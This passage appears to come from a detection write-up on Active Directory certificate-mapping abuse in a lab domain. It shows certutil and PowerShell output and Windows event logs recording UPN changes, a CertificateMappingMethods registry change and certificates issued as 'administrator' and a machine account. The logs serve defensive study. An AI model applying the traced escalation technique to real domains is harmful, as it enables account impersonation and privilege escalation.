          (CT_FLAG_SKIP_AUTO_RENEWAL -- 40000 (262144))
      Template General Flags: 0x1023a (66106)
          (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1)
        CT_FLAG_ADD_EMAIL -- 2
          (CT_FLAG_ADD_OBJ_GUID -- 4)
        CT_FLAG_PUBLISH_TO_DS -- 8
        CT_FLAG_EXPORTABLE_KEY -- 10 (16)
        CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
          (CT_FLAG_MACHINE_TYPE -- 40 (64))
          (CT_FLAG_IS_CA -- 80 (128))
          (CT_FLAG_ADD_DIRECTORY_PATH -- 100 (256))
        CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
          (CT_FLAG_ADD_SUBJECT_DIRECTORY_PATH -- 400 (1024))
          (CT_FLAG_IS_CROSS_CA -- 800 (2048))
          (CT_FLAG_DONOTPERSISTINDB -- 1000 (4096))
        CT_FLAG_IS_DEFAULT -- 10000 (65536)
          (CT_FLAG_IS_MODIFIED -- 20000 (131072))
          (CT_FLAG_IS_DELETED -- 40000 (262144))
          (CT_FLAG_POLICY_MISMATCH -- 80000 (524288))
      Template Private Key Flags: 0x10 (16)
          (CTPRIVATEKEY_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL -- 1)
        CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
          (CTPRIVATEKEY_FLAG_STRONG_KEY_PROTECTION_REQUIRED -- 20 (32))
          (CTPRIVATEKEY_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM -- 40 (64))
          (CTPRIVATEKEY_FLAG_REQUIRE_SAME_KEY_RENEWAL -- 80 (128))
          (CTPRIVATEKEY_FLAG_USE_LEGACY_PROVIDER -- 100 (256))
          (CTPRIVATEKEY_FLAG_EK_TRUST_ON_USE -- 200 (512))
          (CTPRIVATEKEY_FLAG_EK_VALIDATE_CERT -- 400 (1024))
          (CTPRIVATEKEY_FLAG_EK_VALIDATE_KEY -- 800 (2048))
        CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
          (CTPRIVATEKEY_FLAG_ATTEST_PREFERRED -- 1000 (4096))
          (CTPRIVATEKEY_FLAG_ATTEST_REQUIRED -- 2000 (8192))
          (CTPRIVATEKEY_FLAG_ATTEST_WITHOUT_POLICY -- 4000 (16384))
        TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
          (TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536))
          (TEMPLATE_SERVER_VER_2008<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 20000 (131072))
          (TEMPLATE_SERVER_VER_2008R2<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 30000 (196608))
          (TEMPLATE_SERVER_VER_WIN8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 40000 (262144))
          (TEMPLATE_SERVER_VER_WINBLUE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 50000 (327680))
          (TEMPLATE_SERVER_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 60000 (393216))
          (V7<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 70000 (458752))
          (V8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 80000 (524288))
          (V9<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 90000 (589824))
          (V10<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- a0000 (655360))
          (V11<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- b0000 (720896))
          (V12<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- c0000 (786432))
          (V13<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- d0000 (851968))
          (V14<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- e0000 (917504))
          (V15<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- f0000 (983040))
          (CTPRIVATEKEY_FLAG_HELLO_KSP_KEY -- 100000 (1048576))
          (CTPRIVATEKEY_FLAG_HELLO_LOGON_KEY -- 200000 (2097152))
        TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0
          (TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216))
          (TEMPLATE_CLIENT_VER_VISTA<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 2000000 (33554432))
          (TEMPLATE_CLIENT_VER_WIN7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 3000000 (50331648))
          (TEMPLATE_CLIENT_VER_WIN8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 4000000 (67108864))
          (TEMPLATE_CLIENT_VER_WINBLUE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 5000000 (83886080))
          (TEMPLATE_CLIENT_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 6000000 (100663296))
          (V7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 7000000 (117440512))
          (V8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 8000000 (134217728))
          (V9<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 9000000 (150994944))
          (V10<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- a000000 (167772160))
          (V11<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- b000000 (184549376))
          (V12<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- c000000 (201326592))
          (V13<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- d000000 (218103808))
          (V14<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- e000000 (234881024))
          (V15<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- f000000 (251658240))
      Serial Number: "20000000149241a5d99e294fd6000000000014"
    0000    32 00 30 00 30 00 30 00  30 00 30 00 30 00 30 00   2.0.0.0.0.0.0.0.
    0010    31 00 34 00 39 00 32 00  34 00 31 00 61 00 35 00   1.4.9.2.4.1.a.5.
    0020    64 00 39 00 39 00 65 00  32 00 39 00 34 00 66 00   d.9.9.e.2.9.4.f.
    0030    64 00 36 00 30 00 30 00  30 00 30 00 30 00 30 00   d.6.0.0.0.0.0.0.
    0040    30 00 30 00 30 00 30 00  31 00 34 00               0.0.0.0.1.4.
    
      Issuer Name ID: 0x0 CA Version 0.0
      Certificate Effective Date: 7/28/2025 6:09 PM GMT
      Certificate Expiration Date: 7/28/2026 6:09 PM GMT
      Issued Subject Key Identifier: "ce 95 ab 7b 05 17 75 4a 9d e3 6a 4a 18 ad fa 03 a1 26 c8 7d"
    0000    63 00 65 00 20 00 39 00  35 00 20 00 61 00 62 00   c.e. .9.5. .a.b.
    0010    20 00 37 00 62 00 20 00  30 00 35 00 20 00 31 00    .7.b. .0.5. .1.
    0020    37 00 20 00 37 00 35 00  20 00 34 00 61 00 20 00   7. .7.5. .4.a. .
    0030    39 00 64 00 20 00 65 00  33 00 20 00 36 00 61 00   9.d. .e.3. .6.a.
    0040    20 00 34 00 61 00 20 00  31 00 38 00 20 00 61 00    .4.a. .1.8. .a.
    0050    64 00 20 00 66 00 61 00  20 00 30 00 33 00 20 00   d. .f.a. .0.3. .
    0060    61 00 31 00 20 00 32 00  36 00 20 00 63 00 38 00   a.1. .2.6. .c.8.
    0070    20 00 37 00 64 00                                   .7.d.
    
      Binary Public Key:
    0000    30 82 01 0a 02 82 01 01  00 b4 51 07 64 3a 9a 5c
    0010    fa e2 92 f0 c5 49 ba 3d  87 08 1c cc c6 4d e2 b6
    0020    7e f7 da 8f 93 fc dd ce  88 fd cb 22 fe 52 12 c5
    0030    d7 d0 40 4c b7 c5 08 28  b9 31 9b d1 90 ae 90 a1
    0040    24 06 7b b0 c9 02 66 4d  1b d5 b9 ef 61 75 a7 f1
    0050    7e 59 d0 43 cf 1c f5 22  69 c1 1a 5c 9b cc e4 03
    0060    51 d9 f5 42 84 3d 26 8c  91 a6 cf b0 d6 e9 f2 a3
    0070    6f c3 9f 0e 60 ab 7a c3  f9 a2 a1 da 3c e8 66 ae
    0080    e8 14 78 39 04 0c 0d 83  fe c0 ac 69 d2 ae 23 f4
    0090    c0 dc c6 ac d7 eb 65 31  9b 73 62 65 b3 5c d4 73
    00a0    a8 34 e7 c8 c4 b9 7e de  0b 23 fd 64 3a ca a5 88
    00b0    ed d6 5b 62 71 62 62 eb  91 95 6d 94 b9 94 56 8a
    00c0    bf c7 eb 69 f1 98 cb 4b  ba 77 5a fb c8 35 fb 40
    00d0    67 e7 49 09 c0 76 a4 f5  52 ab fa bd e8 f1 92 fd
    00e0    75 5e 07 67 6a 2e 43 4f  41 18 1a 83 0f a5 b9 9a
    00f0    83 22 8a db 78 12 32 cb  98 23 40 24 a1 f8 44 14
    0100    76 ad 1c a5 19 6f e1 f0  f1 02 03 01 00 01
    
      Public Key Length: 0x800 (2048)
      Public Key Algorithm: "1.2.840.113549.1.1.1" RSA (RSA_SIGN)
    0000    31 00 2e 00 32 00 2e 00  38 00 34 00 30 00 2e 00   1...2...8.4.0...
    0010    31 00 31 00 33 00 35 00  34 00 39 00 2e 00 31 00   1.1.3.5.4.9...1.
    0020    2e 00 31 00 2e 00 31 00                            ..1...1.
    
      Public Key Algorithm Parameters:
    0000    05 00                                              ..
    
      Publish Expired Certificate in CRL: 0x0
      User Principal Name: "administrator"
    0000    61 00 64 00 6d 00 69 00  6e 00 69 00 73 00 74 00   a.d.m.i.n.i.s.t.
    0010    72 00 61 00 74 00 6f 00  72 00                     r.a.t.o.r.
    
      Issued Distinguished Name: "CN=viserys.targaryen, CN=Users, DC=essos, DC=local"
    0000    43 00 4e 00 3d 00 76 00  69 00 73 00 65 00 72 00   C.N.=.v.i.s.e.r.
    0010    79 00 73 00 2e 00 74 00  61 00 72 00 67 00 61 00   y.s...t.a.r.g.a.
    0020    72 00 79 00 65 00 6e 00  2c 00 20 00 43 00 4e 00   r.y.e.n.,. .C.N.
    0030    3d 00 55 00 73 00 65 00  72 00 73 00 2c 00 20 00   =.U.s.e.r.s.,. .
    0040    44 00 43 00 3d 00 65 00  73 00 73 00 6f 00 73 00   D.C.=.e.s.s.o.s.
    0050    2c 00 20 00 44 00 43 00  3d 00 6c 00 6f 00 63 00   ,. .D.C.=.l.o.c.
    0060    61 00 6c 00                                        a.l.
    
      Issued Binary Name:
    0000    30 5a 31 15 30 13 06 0a  09 92 26 89 93 f2 2c 64   0Z1.0.....&...,d
    0010    01 19 16 05 6c 6f 63 61  6c 31 15 30 13 06 0a 09   ....local1.0....
    0020    92 26 89 93 f2 2c 64 01  19 16 05 65 73 73 6f 73   .&...,d....essos
    0030    31 0e 30 0c 06 03 55 04  03 13 05 55 73 65 72 73   1.0...U....Users
    0040    31 1a 30 18 06 03 55 04  03 13 11 76 69 73 65 72   1.0...U....viser
    0050    79 73 2e 74 61 72 67 61  72 79 65 6e               ys.targaryen
    
      Issued Country/Region: EMPTY
      Issued Organization: EMPTY
      Issued Organization Unit: EMPTY
      Issued Common Name: "Users
    viserys.targaryen"
    0000    55 00 73 00 65 00 72 00  73 00 0a 00 76 00 69 00   U.s.e.r.s...v.i.
    0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
    0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.
    
      Issued City: EMPTY
      Issued State: EMPTY
      Issued Title: EMPTY
      Issued First Name: EMPTY
      Issued Initials: EMPTY
      Issued Last Name: EMPTY
      Issued Domain Component: "local
    essos"
    0000    6c 00 6f 00 63 00 61 00  6c 00 0a 00 65 00 73 00   l.o.c.a.l...e.s.
    0010    73 00 6f 00 73 00                                  s.o.s.
    
      Issued Email Address: EMPTY
      Issued Street Address: EMPTY
      Issued Unstructured Name: EMPTY
      Issued Unstructured Address: EMPTY
      Issued Device Serial Number: EMPTY
    
    Maximum Row Index: 1
    
    1 Rows
      37 Row Properties, Total Size = 3797, Max Size = 1548, Ave Size = 102
       0 Request Attributes, Total Size = 0, Max Size = 0, Ave Size = 0
       0 Certificate Extensions, Total Size = 0, Max Size = 0, Ave Size = 0
      37 Total Fields, Total Size = 3797, Max Size = 1548, Ave Size = 102
    CertUtil: -view command completed successfully.
```
</details>

### Get-CertRequest
```
Get-CertRequest -Filter 'RequestID -eq 20'


CA                                          : braavos.essos.local\ESSOS-CA
Request.ID                                  : 20
Request.RequesterName                       : ESSOS\viserys.targaryen
Request.CommonName                          : Viserys.targaryen
Request.CallerName                          : ESSOS\viserys.targaryen
Request.DistinguishedName                   : CN=Viserys.targaryen
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            :
Request.SubjectAltNamesAttrib               :
Request.ApplicationPolicies                 :
UPN                                         : administrator
Issued.DistinguishedName                    : CN=viserys.targaryen, CN=Users, DC=essos, DC=local
Issued.CommonName                           : Users
                                              viserys.targaryen
CertificateTemplate                         : User
EnrollmentFlags                             : {CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS, CT_FLAG_AUTO_ENROLLMENT, CT_FLAG_PUBLISH_TO_DS}
SerialNumber                                : 20000000149241a5d99e294fd6000000000014
Certificate.SAN                             : Other Name:Principal Name=administrator
Certificate.ApplicationPolicies             :
Certificate.IssuancePolicies.PolicyName     :
Certificate.IssuancePolicies.GroupCN        :
Certificate.IssuancePolicies.GroupSID       :
Certificate.EKU                             : Encrypting File System (1.3.6.1.4.1.311.10.3.4), Secure Email (1.3.6.1.5.5.7.3.4), Client Authentication
                                              (1.3.6.1.5.5.7.3.2)
Certificate.SID_Extension.SID               : S-1-5-21-666199682-1411342147-2938717855-1114
Certificate.SID_Extension.DistinguishedName : CN=viserys.targaryen,CN=Users,DC=essos,DC=local
Certificate.SID_Extension.SamAccountName    : viserys.targaryen
Certificate.SID_Extension.UPN               : viserys.targaryen@essos.local
Certificate.SID_Extension.CN                : viserys.targaryen
RequestDate                                 : 7/28/2025 6:19:59 PM
StartDate                                   : 7/28/2025 6:09:59 PM
EndDate                                     : 7/28/2026 6:09:59 PM
```


## (CertificateMappingMethods **0x4**)

### 4657 Registry change CertificateMappingMethods
```
A registry value was modified.

Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0x89DA2

Object:
	Object Name:		\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\SecurityProviders\SCHANNEL
	Object Value Name:	CertificateMappingMethods
	Handle ID:		0xaa4
	Operation Type:		Existing registry value modified

Process Information:
	Process ID:		0x60c
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Change Information:
	Old Value Type:		REG_DWORD
	Old Value:		24
	New Value Type:		REG_DWORD
	New Value:		4
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4657</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12801</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:48:46.263230100Z" /> 
  <EventRecordID>148467</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="4" ThreadID="32" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x89da2</Data> 
  <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\SecurityProviders\SCHANNEL</Data> 
  <Data Name="ObjectValueName">CertificateMappingMethods</Data> 
  <Data Name="HandleId">0xaa4</Data> 
  <Data Name="OperationType">%%1905</Data> 
  <Data Name="OldValueType">%%1876</Data> 
  <Data Name="OldValue">24</Data> 
  <Data Name="NewValueType">%%1876</Data> 
  <Data Name="NewValue">4</Data> 
  <Data Name="ProcessId">0x60c</Data> 
  <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  </EventData>
  </Event>
```

### 5136 UPN Change
```
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\missandei
	Account Name:		missandei
	Account Domain:		ESSOS
	Logon ID:		0xE7A1BA

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=viserys.targaryen,CN=Users,DC=essos,DC=local
	GUID:	CN=viserys.targaryen,CN=Users,DC=essos,DC=local
	Class:	user
	
Attribute:
	LDAP Display Name:	userPrincipalName
	Syntax (OID):	2.5.5.12
	Value:	meereen$@essos.local
	
Operation:
	Type:	Value Added
	Correlation ID:	{8904862d-b917-413b-aa98-452eee81c88f}
	Application Correlation ID:	-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:53:58.843937600Z" /> 
  <EventRecordID>148882</EventRecordID> 
  <Correlation ActivityID="{388C4309-0EB8-0001-5643-8C38B80EDC01}" /> 
  <Execution ProcessID="684" ThreadID="4320" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{8904862D-B917-413B-AA98-452EEE81C88F}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1117</Data> 
  <Data Name="SubjectUserName">missandei</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xe7a1ba</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=viserys.targaryen,CN=Users,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{22B9DCC6-D44E-48DB-8443-C106E0B085AE}</Data> 
  <Data Name="ObjectClass">user</Data> 
  <Data Name="AttributeLDAPDisplayName">userPrincipalName</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.12</Data> 
  <Data Name="AttributeValue">meereen$@essos.local</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

### 4738 UPN Change
```
A user account was changed.

Subject:
	Security ID:		ESSOS\missandei
	Account Name:		missandei
	Account Domain:		ESSOS
	Logon ID:		0xE7A1BA

Target Account:
	Security ID:		ESSOS\viserys.targaryen
	Account Name:		viserys.targaryen
	Account Domain:		ESSOS

Changed Attributes:
	SAM Account Name:	-
	Display Name:		-
	User Principal Name:	meereen$@essos.local
	Home Directory:		-
	Home Drive:		-
	Script Path:		-
	Profile Path:		-
	User Workstations:	-
	Password Last Set:	-
	Account Expires:		-
	Primary Group ID:	-
	AllowedToDelegateTo:	-
	Old UAC Value:		-
	New UAC Value:		-
	User Account Control:	-
	User Parameters:	-
	SID History:		-
	Logon Hours:		-

Additional Information:
	Privileges:		-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4738</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>13824</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:53:58.296135200Z" /> 
  <EventRecordID>148735</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="684" ThreadID="2596" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="Dummy">-</Data> 
  <Data Name="TargetUserName">viserys.targaryen</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetSid">S-1-5-21-666199682-1411342147-2938717855-1114</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1117</Data> 
  <Data Name="SubjectUserName">missandei</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xe7a1ba</Data> 
  <Data Name="PrivilegeList">-</Data> 
  <Data Name="SamAccountName">-</Data> 
  <Data Name="DisplayName">-</Data> 
  <Data Name="UserPrincipalName">meereen$@essos.local</Data> 
  <Data Name="HomeDirectory">-</Data> 
  <Data Name="HomePath">-</Data> 
  <Data Name="ScriptPath">-</Data> 
  <Data Name="ProfilePath">-</Data> 
  <Data Name="UserWorkstations">-</Data> 
  <Data Name="PasswordLastSet">-</Data> 
  <Data Name="AccountExpires">-</Data> 
  <Data Name="PrimaryGroupId">-</Data> 
  <Data Name="AllowedToDelegateTo">-</Data> 
  <Data Name="OldUacValue">-</Data> 
  <Data Name="NewUacValue">-</Data> 
  <Data Name="UserAccountControl">-</Data> 
  <Data Name="UserParameters">-</Data> 
  <Data Name="SidHistory">-</Data> 
  <Data Name="LogonHours">-</Data> 
  </EventData>
  </Event>
```

### 4886 Certificate Request

```
Certificate Services received a certificate request.
	
Request ID:	21
Requester:	ESSOS\viserys.targaryen
Attributes:	CertificateTemplate:User
Subject from CSR:	CN=Viserys.targaryen
Subject Alternative Name from CSR:

Requested Template:	User
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:34:53.7206012Z" /> 
  <EventRecordID>31494</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="716" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">21</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:User</Data> 
  <Data Name="Subject">CN=Viserys.targaryen</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">User</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### 4887 Issued Certificate

```
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	21
Requester:	ESSOS\viserys.targaryen
Attributes:	CertificateTemplate:User
Disposition:	3
SKI:		ba f5 82 96 3c 22 c6 70 4b 3b b7 11 d7 0b b6 65 b8 fe ab ce
Subject:	CN=viserys.targaryen, CN=Users, DC=essos, DC=local
Subject Alternative Name:
Other Name:
     Principal Name=meereen$@essos.local

Certificate Template:	User
Serial Number:		2000000015ecf4e4c40afef4f6000000000015
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:34:53.7731247Z" /> 
  <EventRecordID>31498</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="8208" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">21</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:User</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">ba f5 82 96 3c 22 c6 70 4b 3b b7 11 d7 0b b6 65 b8 fe ab ce</Data> 
  <Data Name="Subject">CN=viserys.targaryen, CN=Users, DC=essos, DC=local</Data> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=meereen$@essos.local</Data> 
  <Data Name="CertificateTemplate">User</Data> 
  <Data Name="SerialNumber">2000000015ecf4e4c40afef4f6000000000015</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### 4624 Schannel+Microsoft Unified Security Protocol Provider

```
An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\MEEREEN$
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0xCAA991
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.56.101
	Source Port:		61599

Detailed Authentication Information:
	Logon Process:		Schannel
	Authentication Package:	Microsoft Unified Security Protocol Provider
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:34:56.119370900Z" /> 
  <EventRecordID>61078</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="580" ThreadID="5100" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-0-0</Data> 
  <Data Name="SubjectUserName">-</Data> 
  <Data Name="SubjectDomainName">-</Data> 
  <Data Name="SubjectLogonId">0x0</Data> 
  <Data Name="TargetUserSid">S-1-5-21-666199682-1411342147-2938717855-1001</Data> 
  <Data Name="TargetUserName">MEEREEN$</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0xcaa991</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">Schannel</Data> 
  <Data Name="AuthenticationPackageName">Microsoft Unified Security Protocol Provider</Data> 
  <Data Name="WorkstationName">-</Data> 
  <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">-</Data> 
  <Data Name="KeyLength">0</Data> 
  <Data Name="ProcessId">0x0</Data> 
  <Data Name="ProcessName">-</Data> 
  <Data Name="IpAddress">192.168.56.101</Data> 
  <Data Name="IpPort">61599</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

### certutil output

<details>
<summary>Output of certuril tool</summary>

```
